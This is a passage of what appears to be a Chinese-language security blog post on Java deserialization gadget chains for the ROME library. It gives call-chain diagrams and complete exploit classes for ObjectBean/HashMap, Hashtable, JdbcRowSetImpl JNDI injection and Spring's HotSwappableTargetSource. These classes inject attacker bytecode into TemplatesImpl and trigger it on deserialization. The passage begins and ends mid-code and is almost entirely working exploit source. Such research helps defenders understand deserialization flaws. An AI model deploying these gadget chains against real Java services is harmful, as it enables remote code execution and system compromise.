class="hljs-string">&quot;123&quot;</span>);<br>        <br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> toStringBean.getClass().getDeclaredField(<span class="hljs-string">&quot;_obj&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(toStringBean,templatesimpl);<br>        String s=serialize(hashMap);<br>        deserialize(s);<br><br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">SetFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>        declaredField.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(obj);<br>        <span class="hljs-keyword">return</span> Base64.getEncoder().encodeToString(baos.toByteArray());<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">deserialize</span><span class="hljs-params">(String data)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(Base64.getDecoder().decode(data));<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);<br>        <span class="hljs-keyword">return</span> ois.readObject();<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="objectbean"><a class="markdownIt-Anchor" href="#objectbean"></a> ObjectBean</h4><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl">H<span class="hljs-function"><span class="hljs-title">ashMap</span>.readObject-&gt;</span>H<span class="hljs-function"><span class="hljs-title">ashMap</span>.hash-&gt;</span>O<span class="hljs-function"><span class="hljs-title">bjectBean</span>.hashcode-&gt;</span>O<span class="hljs-function"><span class="hljs-title">bjectBean</span>.beanHashCode-&gt;</span>T<span class="hljs-function"><span class="hljs-title">oStringBean</span>.toString-&gt;</span>TemplatesImpl链<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EXP3</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templatesimpl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        SetFieldValue(templatesimpl,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C:\\Users\\86151\\hexo-blog\\source\\_posts\\ysoserial\\ysoserial\\target\\classes\\Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes=<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;code&#125;;<br>        SetFieldValue(templatesimpl,<span class="hljs-string">&quot;_bytecodes&quot;</span>,codes);<br>        SetFieldValue(templatesimpl,<span class="hljs-string">&quot;_tfactory&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        SetFieldValue(templatesimpl,<span class="hljs-string">&quot;_transletIndex&quot;</span>,<span class="hljs-number">1</span>);<br>        <span class="hljs-type">ToStringBean</span> <span class="hljs-variable">toStringBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(Templates.class,<span class="hljs-string">&quot;1&quot;</span>); <span class="hljs-comment">//要用Templates.class不能用TemplatesImpl.class,</span><br>        <span class="hljs-type">ObjectBean</span> <span class="hljs-variable">objectBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(ToStringBean.class,toStringBean);<br>        HashMap&lt;Object,Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(objectBean,<span class="hljs-string">&quot;123&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> toStringBean.getClass().getDeclaredField(<span class="hljs-string">&quot;_obj&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(toStringBean,templatesimpl);<br>        String s=serialize(hashMap);<br>        deserialize(s);<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">SetFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>        declaredField.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(obj);<br>        <span class="hljs-keyword">return</span> Base64.getEncoder().encodeToString(baos.toByteArray());<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">deserialize</span><span class="hljs-params">(String data)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(Base64.getDecoder().decode(data));<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);<br>        <span class="hljs-keyword">return</span> ois.readObject();<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="hashtable"><a class="markdownIt-Anchor" href="#hashtable"></a> HashTable</h4><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl">H<span class="hljs-function"><span class="hljs-title">ashtable</span>.readObject-&gt;</span>H<span class="hljs-function"><span class="hljs-title">ashtable</span>.reconstitutionPut-&gt;</span>O<span class="hljs-function"><span class="hljs-title">bjectBean</span>.hashcode-&gt;</span>O<span class="hljs-function"><span class="hljs-title">bjectBean</span>.beanHashCode-&gt;</span>T<span class="hljs-function"><span class="hljs-title">oStringBean</span>.toString-&gt;</span>TemplatesImpl链<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.Hashtable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EXP4</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templatesimpl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        SetFieldValue(templatesimpl,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C:\\Users\\86151\\hexo-blog\\source\\_posts\\ysoserial\\ysoserial\\target\\classes\\Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes=<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;code&#125;;<br>        SetFieldValue(templatesimpl,<span class="hljs-string">&quot;_bytecodes&quot;</span>,codes);<br>        SetFieldValue(templatesimpl,<span class="hljs-string">&quot;_tfactory&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        SetFieldValue(templatesimpl,<span class="hljs-string">&quot;_transletIndex&quot;</span>,<span class="hljs-number">1</span>);<br>        <span class="hljs-type">ToStringBean</span> <span class="hljs-variable">toStringBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(Templates.class,<span class="hljs-string">&quot;1&quot;</span>); <span class="hljs-comment">//要用Templates.class不能用TemplatesImpl.class,</span><br>        <span class="hljs-type">ObjectBean</span> <span class="hljs-variable">objectBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(ToStringBean.class,toStringBean);<br><br>        Hashtable&lt;Object,Object&gt;  hashtable=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>&lt;&gt;();<br>        hashtable.put(objectBean,<span class="hljs-string">&quot;1&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> toStringBean.getClass().getDeclaredField(<span class="hljs-string">&quot;_obj&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(toStringBean,templatesimpl);<br>        String s=serialize(hashtable);<br>        deserialize(s);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">SetFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>        declaredField.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(obj);<br>        <span class="hljs-keyword">return</span> Base64.getEncoder().encodeToString(baos.toByteArray());<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">deserialize</span><span class="hljs-params">(String data)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(Base64.getDecoder().decode(data));<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);<br>        <span class="hljs-keyword">return</span> ois.readObject();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="jdbcrowsetimpl"><a class="markdownIt-Anchor" href="#jdbcrowsetimpl"></a> JdbcRowSetImpl</h4><p>jdk版本受jdbc注入的限制</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl">H<span class="hljs-function"><span class="hljs-title">ashMap</span>.readObject-&gt;</span>H<span class="hljs-function"><span class="hljs-title">ashMap</span>.hash-&gt;</span>O<span class="hljs-function"><span class="hljs-title">bjectBean</span>-&gt;</span>O<span class="hljs-function"><span class="hljs-title">bjectBean</span>.hashcode-&gt;</span>O<span class="hljs-function"><span class="hljs-title">bjectBean</span>.beanHashCode-&gt;</span>T<span class="hljs-function"><span class="hljs-title">oStringBean</span>.toString-&gt;</span>J<span class="hljs-function"><span class="hljs-title">dbcRowSetImpl</span>.getDatabaseMetaData-&gt;</span>J<span class="hljs-function"><span class="hljs-title">dbcRowSetImpl</span>.connect-&gt;</span>JNDI注入链子<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> com.sun.rowset.JdbcRowSetImpl;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;<br><br><span class="hljs-keyword">import</span> javax.sql.rowset.JdbcRowSet;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EXP5</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">JdbcRowSetImpl</span> <span class="hljs-variable">jdbcRowSet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JdbcRowSetImpl</span>();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;ldap://127.0.0.1:1099/Calculator&quot;</span>;<br>        jdbcRowSet.setDataSourceName(url);<br><br>        <span class="hljs-type">ToStringBean</span> <span class="hljs-variable">toStringBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(JdbcRowSetImpl.class,<span class="hljs-string">&quot;1&quot;</span>); <span class="hljs-comment">//要用JdbcRowSetImpl.class不能用JdbcRowSet.class,</span><br>        <span class="hljs-type">ObjectBean</span> <span class="hljs-variable">objectBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(ToStringBean.class,toStringBean);<br>        HashMap&lt;Object,Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(objectBean,<span class="hljs-string">&quot;123&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> toStringBean.getClass().getDeclaredField(<span class="hljs-string">&quot;_obj&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(toStringBean,jdbcRowSet);<br>        String s=serialize(hashMap);<br>        deserialize(s);<br><br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">SetFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>        declaredField.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(obj);<br>        <span class="hljs-keyword">return</span> Base64.getEncoder().encodeToString(baos.toByteArray());<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">deserialize</span><span class="hljs-params">(String data)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(Base64.getDecoder().decode(data));<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);<br>        <span class="hljs-keyword">return</span> ois.readObject();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="hotswappabletargetsource"><a class="markdownIt-Anchor" href="#hotswappabletargetsource"></a> HotSwappableTargetSource</h4><p>spring原生链</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl">H<span class="hljs-function"><span class="hljs-title">ashMap</span>.readObject-&gt;</span>H<span class="hljs-function"><span class="hljs-title">ashMap</span>.putVal-&gt;</span>H<span class="hljs-function"><span class="hljs-title">otSwappableTargetSource</span>.equals-&gt;</span>T<span class="hljs-function"><span class="hljs-title">oStringBean</span>.toString-&gt;</span>TemplatesImpl链<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;<br><span class="hljs-keyword">import</span> org.springframework.aop.target.HotSwappableTargetSource;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EXP6</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templatesimpl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        SetFieldValue(templatesimpl,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C:\\Users\\86151\\hexo-blog\\source\\_posts\\ysoserial\\ysoserial\\target\\classes\\Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes=<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;code&#125;;<br>        SetFieldValue(templatesimpl,<span class="hljs-string">&quot;_bytecodes&quot;</span>,codes);<br>        SetFieldValue(templatesimpl,<span class="hljs-string">&quot;_tfactory&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        SetFieldValue(templatesimpl,<span class="hljs-string">&quot;_transletIndex&quot;</span>,<span class="hljs-number">1</span>);<br>        <span class="hljs-type">ToStringBean</span> <span class="hljs-variable">toStringBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(Templates.class,<span class="hljs-string">&quot;1&quot;</span>); <span class="hljs-comment">//要用Templates.class不能用TemplatesImpl.class</span><br><br>        <span class="hljs-type">HotSwappableTargetSource</span> <span class="hljs-variable">h1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HotSwappableTargetSource</span>(toStringBean);<br>        <span class="hljs-type">HotSwappableTargetSource</span> <span class="hljs-variable">h2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HotSwappableTargetSource</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">XString</span>(<span class="hljs-string">&quot;xxx&quot;</span>));<br><br>        HashMap&lt;Object,Object&gt; hashMap = <span class="hljs-keyword">new</span> <span 